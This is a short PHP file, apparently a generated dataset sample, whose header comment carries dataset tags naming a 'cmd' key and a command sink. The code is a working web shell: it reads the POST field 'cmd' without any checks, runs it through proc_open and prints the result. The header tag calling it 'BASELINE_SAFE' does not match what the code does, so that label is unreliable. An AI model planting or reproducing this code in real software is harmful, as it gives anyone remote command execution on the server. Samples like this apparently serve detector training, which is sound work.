<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_ISSET; SKELETON=S3; KEY=cmd; SINK=B5; VAR=v0152 */
function SINK_B5($command){
    $process = proc_open($command, [["pipe", "r"], ["pipe", "w"]], $pipes);
            if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            proc_close($process);
            echo $output;
}
}
$inp = isset($_POST["cmd"]) ? (string)$_POST["cmd"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B5($x);
};
$out = $f($inp);
echo (string)($out);
?>
